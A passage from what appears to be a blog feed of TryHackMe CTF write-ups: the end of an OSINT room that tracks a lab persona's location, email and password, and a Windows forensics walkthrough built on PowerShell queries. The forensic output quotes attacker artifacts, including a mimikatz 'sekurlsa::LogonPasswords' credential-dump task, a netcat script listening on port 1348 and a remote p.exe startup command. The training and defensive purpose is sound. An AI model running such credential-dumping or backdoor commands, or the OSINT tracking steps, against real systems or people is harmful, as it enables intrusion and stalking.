</code></pre> <p>We can see in the copyright section that the image author’s name is <em>OWoodflint</em>. After doing a google search, we can find his <a href="https://twitter.com/OWoodflint">X</a>’s (twitter) profile. Then, we can see his profile picture is a cat</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">cat</code></em></p> <p><strong>What city is this person in?</strong></p> <p>With the website <a href="https://wigle.net/">wigle.net</a>, which is a map of many wifi networks availale across the world, we can try to locate him using his WiFi’s BSSID he provided on his X account.</p> <p><img src="/assets/img/images/thm_ctf_ohsint/H1ZNI5MBT.png" alt="BSSID Location"/></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">London</code></em></p> <p><strong>What is the SSID of the WAP he connected to?</strong></p> <p>To see the Wifi’s SSID, we need first to create an account. After that, we have to zoom until we see the correct network.</p> <p><img src="/assets/img/images/thm_ctf_ohsint/Hy_awqGHa.png" alt="SSID Location"/></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">UnileverWiFi</code></em></p> <p><strong>What is his personal email address?</strong></p> <p>After a google search, we can find his email address on one of his <a href="https://github.com/OWoodfl1nt/people_finder">GitHub Repositories</a>.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Owoodflint@gmail.com</code></em></p> <p><strong>What site did you find his email address on?</strong></p> <p>Like said previously, on GitHub.</p> <p>*Answer: <code class="language-plaintext highlighter-rouge">GitHub</code></p> <p><strong>Where has he gone on holiday?</strong></p> <p>On his <a href="https://oliverwoodflint.wordpress.com/author/owoodflint/">personal blog</a>, he says he went to New York.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">New York</code></em></p> <p><strong>What is the person’s password?</strong></p> <p>After digging in his blog’s source code, we can see a weird string appearing.</p> <p><img src="/assets/img/images/thm_ctf_ohsint/Bk5O25MBT.png" alt="Blog Source Code"/></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">pennYDr0pper.!</code></em></p>]]></content><author><name></name></author><category term="THM"/><category term="CTF"/><category term="OSINT"/><summary type="html"><![CDATA[Introduction]]></summary></entry><entry><title type="html">THM CTF Investigating Windows</title><link href="https://nonohm.github.io/blog/2023/THM-CTF-Investigating-Windows/" rel="alternate" type="text/html" title="THM CTF Investigating Windows"/><published>2023-10-08T15:02:47+00:00</published><updated>2023-10-08T15:02:47+00:00</updated><id>https://nonohm.github.io/blog/2023/THM-CTF-Investigating-Windows</id><content type="html" xml:base="https://nonohm.github.io/blog/2023/THM-CTF-Investigating-Windows/"><![CDATA[<h1 id="thm-ctf-investigating-windows-writeup">THM CTF Investigating Windows Writeup</h1> <h2 id="introduction">Introduction</h2> <p>In today’s CTF, we’ll investigate a windows machine that has been hacked to find clues of what the hacker might have done.</p> <h2 id="task-1---investigating-windows">Task 1 - Investigating Windows</h2> <p>We have to connect to the infected machine through RDP.</p> <p>Username: Administrator Password: letmein123!</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xfreerdp /v:10.10.36.176 /u:Administrator /p:letmein123!
</code></pre></div></div> <p>After being connected to it, we check the version of windows that is running.</p> <pre><code class="language-cmd">winver
</code></pre> <p><img src="/assets/img/images/thm_ctf_investigating_windows_writeup/HyCRqXgWp.png" alt="Winver"/></p> <p><strong>Whats the version and year of the windows machine?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Windows Server 2016</code></em></p> <p>We also have to check who was the last person connected to the machine.</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-LocalUser</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">Lastlogon</span><span class="w">

</span><span class="n">Name</span><span class="w">           </span><span class="nx">LastLogon</span><span class="w">
</span><span class="o">----</span><span class="w">           </span><span class="o">---------</span><span class="w">
</span><span class="n">Administrator</span><span class="w">  </span><span class="nx">10/8/2023</span><span class="w"> </span><span class="nx">1:09:49</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">DefaultAccount</span><span class="w">
</span><span class="nx">Guest</span><span class="w">
</span><span class="n">Jenny</span><span class="w">
</span><span class="nx">John</span><span class="w">           </span><span class="nx">3/2/2019</span><span class="w"> </span><span class="nx">5:48:32</span><span class="w"> </span><span class="nx">PM</span><span class="w">

</span></code></pre></div></div> <p><strong>Which user logged in last?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Administrator</code></em></p> <p><strong>When did John log onto the system last?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">03/02/2019 5:48:32 PM</code></em></p> <p>To get which programs run on startup, we can use the following command on Powershell.</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-CimInstance</span><span class="w"> </span><span class="nt">-ClassName</span><span class="w"> </span><span class="nx">Win32_StartupCommand</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nt">-Property</span><span class="w"> </span><span class="nx">Command</span><span class="p">,</span><span class="w"> </span><span class="nx">Description</span><span class="p">,</span><span class="w"> </span><span class="nx">User</span><span class="w">

</span><span class="kr">Command</span><span class="w">                                                </span><span class="n">Description</span><span class="w"> </span><span class="nx">User</span><span class="w">
</span><span class="o">-------</span><span class="w">                                                </span><span class="o">-----------</span><span class="w"> </span><span class="o">----</span><span class="w">
</span><span class="n">C:\TMP\p.exe</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nx">\\10.34.2.3</span><span class="w"> </span><span class="s1">'net user'</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">C:\TMP\o2.txt</span><span class="w"> </span><span class="nx">UpdateSvc</span><span class="w">   </span><span class="nx">Public</span><span class="w">
</span></code></pre></div></div> <p>We can see at every startup, a suspicious program connect to an unknown IP address.</p> <p><strong>What IP does the system connect to when it first starts?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">10.34.2.3</code></em></p> <p>We need to know who are the system administators other than <em>Administrator</em> if the hacker can access to the machine with those privileges.</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-LocalGroupMember</span><span class="w"> </span><span class="nx">Administrators</span><span class="w">

</span><span class="n">ObjectClass</span><span class="w"> </span><span class="nx">Name</span><span class="w">                          </span><span class="nx">PrincipalSource</span><span class="w">
</span><span class="o">-----------</span><span class="w"> </span><span class="o">----</span><span class="w">                          </span><span class="o">---------------</span><span class="w">
</span><span class="n">User</span><span class="w">        </span><span class="nx">EC2AMAZ-I8UHO76\Administrator</span><span class="w"> </span><span class="nx">Local</span><span class="w">
</span><span class="n">User</span><span class="w">        </span><span class="nx">EC2AMAZ-I8UHO76\Guest</span><span class="w">         </span><span class="nx">Local</span><span class="w">
</span><span class="n">User</span><span class="w">        </span><span class="nx">EC2AMAZ-I8UHO76\Jenny</span><span class="w">         </span><span class="nx">Local</span><span class="w">
</span></code></pre></div></div> <p><strong>What two accounts had administrative privileges (other than the Administrator user)?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Guest, Jenny</code></em></p> <p>To get the current scheduled tasks, we can use the command <code class="language-plaintext highlighter-rouge">Get-ScheduledTask</code></p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ScheduledTask</span><span class="w">

</span><span class="n">TaskPath</span><span class="w">                                       </span><span class="nx">TaskName</span><span class="w">                          </span><span class="nx">State</span><span class="w">
</span><span class="o">--------</span><span class="w">                                       </span><span class="o">--------</span><span class="w">                          </span><span class="o">-----</span><span class="w">
</span><span class="n">\</span><span class="w">                                              </span><span class="nx">Amazon</span><span class="w"> </span><span class="nx">Ec2</span><span class="w"> </span><span class="nx">Launch</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">Instance</span><span class="w"> </span><span class="nx">I...</span><span class="w"> </span><span class="nx">Disabled</span><span class="w">
</span><span class="n">\</span><span class="w">                                              </span><span class="nx">check</span><span class="w"> </span><span class="nx">logged</span><span class="w"> </span><span class="nx">in</span><span class="w">                   </span><span class="nx">Ready</span><span class="w">
</span><span class="n">\</span><span class="w">                                              </span><span class="nx">Clean</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">system</span><span class="w">                 </span><span class="nx">Ready</span><span class="w">
</span><span class="n">\</span><span class="w">                                              </span><span class="nx">falshupdate22</span><span class="w">                     </span><span class="nx">Ready</span><span class="w">
</span></code></pre></div></div> <p>There’s 4 suspicious tasks. To get their actions, we run the command <code class="language-plaintext highlighter-rouge">(ScheduledTask "Clean file system").Actions</code></p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="p">(</span><span class="n">Get-ScheduledTask</span><span class="w"> </span><span class="s1">'Clean file system'</span><span class="p">)</span><span class="o">.</span><span class="nf">Actions</span><span class="w">


</span><span class="n">Id</span><span class="w">               </span><span class="p">:</span><span class="w">
</span><span class="n">Arguments</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="nx">1348</span><span class="w">
</span><span class="n">Execute</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">C:\TMP\nc.ps1</span><span class="w">
</span><span class="n">WorkingDirectory</span><span class="w"> </span><span class="p">:</span><span class="w">
</span><span class="n">PSComputerName</span><span class="w">   </span><span class="p">:</span><span class="w">



</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="p">(</span><span class="n">Get-ScheduledTask</span><span class="w"> </span><span class="s1">'Check logged in'</span><span class="p">)</span><span class="o">.</span><span class="nf">Actions</span><span class="w">


</span><span class="n">Id</span><span class="w">               </span><span class="p">:</span><span class="w">
</span><span class="n">Arguments</span><span class="w">        </span><span class="p">:</span><span class="w">
</span><span class="n">Execute</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="s2">"C:\Program Files (x86)\Internet Explorer\iexplore.exe"</span><span class="w">
</span><span class="n">WorkingDirectory</span><span class="w"> </span><span class="p">:</span><span class="w">
</span><span class="n">PSComputerName</span><span class="w">   </span><span class="p">:</span><span class="w">



</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="p">(</span><span class="n">Get-ScheduledTask</span><span class="w"> </span><span class="s1">'falshupdate22'</span><span class="p">)</span><span class="o">.</span><span class="nf">Actions</span><span class="w">


</span><span class="n">Id</span><span class="w">               </span><span class="p">:</span><span class="w">
</span><span class="n">Arguments</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nt">-WindowStyle</span><span class="w"> </span><span class="nx">Hidden</span><span class="w"> </span><span class="nt">-nop</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">""</span><span class="w">
</span><span class="n">Execute</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">powershell.exe</span><span class="w">
</span><span class="n">WorkingDirectory</span><span class="w"> </span><span class="p">:</span><span class="w">
</span><span class="n">PSComputerName</span><span class="w">   </span><span class="p">:</span><span class="w">



</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="p">(</span><span class="n">Get-ScheduledTask</span><span class="w"> </span><span class="s1">'GameOver'</span><span class="p">)</span><span class="o">.</span><span class="nf">Actions</span><span class="w">


</span><span class="n">Id</span><span class="w">               </span><span class="p">:</span><span class="w">
</span><span class="n">Arguments</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">sekurlsa::LogonPasswords</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">C:\TMP\o.txt</span><span class="w">
</span><span class="n">Execute</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">C:\TMP\mim.exe</span><span class="w">
</span><span class="n">WorkingDirectory</span><span class="w"> </span><span class="p">:</span><span class="w">
</span><span class="n">PSComputerName</span><span class="w">   </span><span class="p">:</span><span class="w">

</span></code></pre></div></div> <p><strong>Whats the name of the scheduled task that is malicious.</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">clean file system</code></em></p> <p><strong>What file was the task trying to run daily?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">nc.ps1</code></em></p> <p><strong>What port did this file listen locally for?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">1348</code></em></p> <p>With the last ran command <code class="language-plaintext highlighter-rouge">Get-LocalUser | Select Name, Lastlogon</code>, we know the user account <em>Jenny</em> never logged in.</p> <p><strong>When did Jenny last logon?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Never</code></em></p> <p>To know more informations about Jenny (because the account looks suspect), we can run <code class="language-plaintext highlighter-rouge">net user Jenny</code> or <code class="language-plaintext highlighter-rouge">Get-LocalUser Jenny | Select *</code></p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-LocalUser</span><span class="w"> </span><span class="nx">Jenny</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="o">*</span><span class="w">


</span><span class="n">AccountExpires</span><span class="w">         </span><span class="p">:</span><span class="w">
</span><span class="n">Description</span><span class="w">            </span><span class="p">:</span><span class="w">
</span><span class="n">Enabled</span><span class="w">                </span><span class="p">:</span><span class="w"> </span><span class="nx">True</span><span class="w">
</span><span class="n">FullName</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="nx">Jenny</span><span class="w">
</span><span class="n">PasswordChangeableDate</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">3/2/2019</span><span class="w"> </span><span class="nx">4:52:25</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">PasswordExpires</span><span class="w">        </span><span class="p">:</span><span class="w">
</span><span class="n">UserMayChangePassword</span><span class="w">  </span><span class="p">:</span><span class="w"> </span><span class="nx">True</span><span class="w">
</span><span class="n">PasswordRequired</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">True</span><span class="w">
</span><span class="n">PasswordLastSet</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">3/2/2019</span><span class="w"> </span><span class="nx">4:52:25</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">LastLogon</span><span class="w">              </span><span class="p">:</span><span class="w">
</span><span class="n">Name</span><span class="w">                   </span><span class="p">:</span><span class="w"> </span><span class="nx">Jenny</span><span class="w">
</span><span class="n">SID</span><span class="w">                    </span><span class="p">:</span><span class="w"> </span><span class="nx">S-1-5-21-3685962493-259677494-3116396707-1008</span><span class="w">
</span><span class="n">PrincipalSource</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">Local</span><span class="w">
</span><span class="n">ObjectClass</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">User</span><span class="w">
</span></code></pre></div></div> <p><strong>At what date did the compromise take place?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">03/02/2019</code></em></p> <p>To know when Windows first assigned special privileges to a new logon, we can use <code class="language-plaintext highlighter-rouge">Get-EventLog</code> with powershell and some filter or the Event Viewer. With some research, we know the EventID assigned to 4672 and because the hint says <code class="language-plaintext highlighter-rouge">00/00/0000 0:00:49 PM</code>, it helps to narrow our results.</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$startTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Date</span><span class="w"> </span><span class="s2">"3/2/2019 4:00:00 PM"</span><span class="w">
</span><span class="nv">$endTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Date</span><span class="w"> </span><span class="s2">"3/2/2019 5:00:00 PM"</span><span class="w">
</span><span class="n">Get-EventLog</span><span class="w"> </span><span class="nt">-LogName</span><span class="w"> </span><span class="s2">"Security"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">EventID</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="mi">4672</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">TimeGenerated</span><span class="w"> </span><span class="o">-ge</span><span class="w"> </span><span class="nv">$startTime</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">TimeGenerated</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="nv">$endTime</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nt">-Property</span><span class="w"> </span><span class="p">@{</span><span class="nx">Label</span><span class="o">=</span><span class="s2">"LogonName"</span><span class="p">;</span><span class="nx">Expression</span><span class="o">=</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="n">ReplacementStrings</span><span class="p">[</span><span class="mi">0</span><span class="p">]}},</span><span class="w"> </span><span class="p">@{</span><span class="nx">Label</span><span class="o">=</span><span class="s2">"CreationTime"</span><span class="p">;</span><span class="nx">Expression</span><span class="o">=</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">TimeGenerated</span><span class="p">}},</span><span class="w"> </span><span class="p">@{</span><span class="nx">Label</span><span class="o">=</span><span class="s2">"Description"</span><span class="p">;</span><span class="nx">Expression</span><span class="o">=</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Message</span><span class="p">}}</span><span class="w">
</span></code></pre></div></div> <p>Or to get the non-concatenated Descriptions</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$startTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Date</span><span class="w"> </span><span class="s2">"3/2/2019 4:00:00 PM"</span><span class="w">
</span><span class="nv">$endTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Date</span><span class="w"> </span><span class="s2">"3/2/2019 5:00:00 PM"</span><span class="w">
</span><span class="n">Get-EventLog</span><span class="w"> </span><span class="nt">-LogName</span><span class="w"> </span><span class="s2">"Security"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">EventID</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="mi">4672</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">TimeGenerated</span><span class="w"> </span><span class="o">-ge</span><span class="w"> </span><span class="nv">$startTime</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">TimeGenerated</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="nv">$endTime</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nv">$logonName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="n">ReplacementStrings</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">
    </span><span class="nv">$creationTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">TimeGenerated</span><span class="w">
    </span><span class="nv">$description</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Message</span><span class="w"> </span><span class="o">-split</span><span class="w"> </span><span class="s2">"</span><span class="se">`r`n</span><span class="s2">"</span><span class="w">  </span><span class="c"># Split the message into an array of lines</span><span class="w">
    
    </span><span class="c"># Output each line as a separate object</span><span class="w">
    </span><span class="nv">$description</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="p">[</span><span class="n">PSCustomObject</span><span class="p">]@{</span><span class="w">
            </span><span class="nx">LogonName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$logonName</span><span class="w">
            </span><span class="nx">CreationTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$creationTime</span><span class="w">
            </span><span class="nx">Description</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$_</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nt">-Property</span><span class="w"> </span><span class="nx">LogonName</span><span class="p">,</span><span class="w"> </span><span class="nx">CreationTime</span><span class="p">,</span><span class="w"> </span><span class="nx">Description</span><span class="w">

</span><span class="n">S-1-5-18</span><span class="w">                                     </span><span class="nx">3/2/2019</span><span class="w"> </span><span class="nx">4:04:49</span><span class="w"> </span><span class="nx">PM</span><span class="w"> </span><span class="nx">Special</span><span class="w"> </span><span class="nx">privileges</span><span class="w"> </span><span class="nx">assigned</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">new</span><span class="w"> </span><span class="nx">logon.</span><span class="w">
</span><span class="n">S-1-5-18</span><span class="w">                                     </span><span class="nx">3/2/2019</span><span class="w"> </span><span class="nx">4:04:49</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">S-1-5-18</span><span class="w">                                     </span><span class="nx">3/2/2019</span><span class="w"> </span><span class="nx">4:04:49</span><span class="w"> </span><span class="nx">PM</span><span class="w"> </span><span class="nx">Subject:</span><span class="w">
</span><span class="n">S-1-5-18</span><span class="w">                                     </span><span class="nx">3/2/2019</span><span class="w"> </span><span class="nx">4:04:49</span><span class="w"> </span><span class="nx">PM</span><span class="w">        </span><span class="nx">Security</span><span class="w"> </span><span class="nx">ID:</span><span class="w">            </span><span class="nx">S-1-5-18</span><span class="w">
</span><span class="n">S-1-5-18</span><span class="w">                                     </span><span class="nx">3/2/2019</span><span class="w"> </span><span class="nx">4:04:49</span><span class="w"> </span><span class="nx">PM</span><span class="w">        </span><span class="nx">Account</span><span class="w"> </span><span class="nx">Name:</span><span class="w">           </span><span class="nx">SYSTEM</span><span class="w">
</span><span class="n">S-1-5-18</span><span class="w">                                     </span><span class="nx">3/2/2019</span><span class="w"> </span><span class="nx">4:04:49</span><span class="w"> </span><span class="nx">PM</span><span class="w">        </span><span class="nx">Account</span><span class="w"> </span><span class="nx">Domain:</span><span class="w">         </span><span class="nx">NT</span><span class="w"> </span><span class="nx">AUTHORITY</span><span class="w">
</span><span class="n">S-1-5-18</span><span class="w">                                     </span><span class="nx">3/2/2019</span><span class="w"> </span><span class="nx">4:04:49</span><span class="w"> </span><span class="nx">PM</span><span class="w">        </span><span class="nx">Logon</span><span class="w"> </span><span class="nx">ID:</span><span class="w">               </span><span class="nx">0x3e7</span><span class="w">
</span><span class="n">S-1-5-18</span><span class="w">                                     </span><span class="nx">3/2/2019</span><span class="w"> </span><span class="nx">4:04:49</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">S-1-5-18</span><span class="w">                                     </span><span class="nx">3/2/2019</span><span class="w"> </span><span class="nx">4:04:49</span><span class="w"> </span><span class="nx">PM</span><span class="w"> </span><span class="nx">Privileges:</span><span class="w">            </span><span class="nx">SeAssignPrimaryTokenPrivilege</span><span class="w">
</span><span class="n">S-1-5-18</span><span class="w">                                     </span><span class="nx">3/2/2019</span><span class="w"> </span><span class="nx">4:04:49</span><span class="w"> </span><span class="nx">PM</span><span class="w">                        </span><span class="nx">SeTcbPrivilege</span><span class="w">

</span><span class="n">S-1-5-18</span><span class="w">                                     </span><span class="nx">3/2/2019</span><span class="w"> </span><span class="nx">4:04:49</span><span class="w"> </span><span class="nx">PM</span><span class="w">                        </span><span class="nx">SeSecurityPrivilege</span><span class="w">

</span><span class="n">S-1-5-18</span><span class="w">                                     </span><span class="nx">3/2/2019</span><span class="w"> </span><span class="nx">4:04:49</span><span class="w"> </span><span class="nx">PM</span><span class="w">                        </span><span class="nx">SeTakeOwnershipPrivilege</span><span class="w">

</span><span class="n">S-1-5-18</span><span class="w">                                     </span><span class="nx">3/2/2019</span><span class="w"> </span><span class="nx">4:04:49</span><span class="w"> </span><span class="nx">PM</span><span class="w">                        </span><span class="nx">SeLoadDriverPrivilege</span><span class="w">

</span><span class="n">S-1-5-18</span><span class="w">                                     </span><span class="nx">3/2/2019</span><span class="w"> </span><span class="nx">4:04:49</span><span class="w"> </span><span class="nx">PM</span><span class="w">                        </span><span class="nx">SeBackupPrivilege</span><span class="w">

</span><span class="n">S-1-5-18</span><span class="w">                                     </span><span class="nx">3/2/2019</span><span class="w"> </span><span class="nx">4:04:49</span><span class="w"> </span><span class="nx">PM</span><span class="w">                        </span><span class="nx">SeRestorePrivilege</span><span class="w">

</span><span class="n">S-1-5-18</span><span class="w">                                     </span><span class="nx">3/2/2019</span><span class="w"> </span><span class="nx">4:04:49</span><span class="w"> </span><span class="nx">PM</span><span class="w">                        </span><span class="nx">SeDebugPrivilege</span><span class="w">

</span><span class="n">S-1-5-18</span><span class="w">                                     </span><span class="nx">3/2/2019</span><span class="w"> </span><span class="nx">4:04:49</span><span class="w"> </span><span class="nx">PM</span><span class="w">                        </span><span class="nx">SeAuditPrivilege</span><span class="w">

</span><span class="n">S-1-5-18</span><span class="w">                                     </span><span class="nx">3/2/2019</span><span class="w"> </span><span class="nx">4:04:49</span><span class="w"> </span><span class="nx">PM</span><span class="w">                        </span><span class="nx">SeSystemEnvironmentPrivilege</span><span class="w">

</span><span class="n">S-1-5-18</span><span class="w">                                     </span><span class="nx">3/2/2019</span><span class="w"> </span><span class="nx">4:04:49</span><span class="w"> </span><span class="nx">PM</span><span class="w">                        </span><span class="nx">SeImpersonatePrivilege</span><span class="w">

</span><span class="n">S-1-5-18</span><span class="w">                                     </span><span class="nx">3/2/2019</span><span class="w"> </span><span class="nx">4:04:49</span><span class="w"> </span><span class="nx">PM</span><span class="w">                        </span><span class="nx">SeDelegateSessionUserImpersonatePrivilege</span><span class="w">
</span></code></pre></div></div> <p><strong>During the compromise, at what time did Windows first assign special privileges to a new logon?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">03/02/2019 4:04:49 PM</code></em></p> <p>We now look at the scheduled task <em>GameOver</em>. It shows that it uses mimikatz to retrieve passwords.</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ScheduledTaskInfo</span><span class="w"> </span><span class="s1">'GameOver'</span><span class="w">


</span><span class="n">LastRunTime</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">10/8/2023</span><span class="w"> </span><span class="nx">2:27:27</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">LastTaskResult</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
</span><span class="n">NextRunTime</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">10/8/2023</span><span class="w"> </span><span class="nx">2:32:32</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">NumberOfMissedRuns</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
</span><span class="n">TaskName</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">GameOver</span><span class="w">
</span><span class="n">TaskPath</span><span class="w">           </span><span class="p">:</span><span class="w">
</span><span class="n">PSComputerName</span><span class="w">     </span><span class="p">:</span><span class="w">

</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="p">(</span><span class="n">Get-ScheduledTask</span><span class="w"> </span><span class="s1">'GameOver'</span><span class="p">)</span><span class="o">.</span><span class="nf">Actions</span><span class="w">


</span><span class="n">Id</span><span class="w">               </span><span class="p">:</span><span class="w">
</span><span class="n">Arguments</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">sekurlsa::LogonPasswords</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">C:\TMP\o.txt</span><span class="w">
</span><span class="n">Execute</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">C:\TMP\mim.exe</span><span class="w">
</span><span class="n">WorkingDirectory</span><span class="w"> </span><span class="p">:</span><span class="w">
</span><span class="n">PSComputerName</span><span class="w">   </span><span class="p">:</span><span class="w">

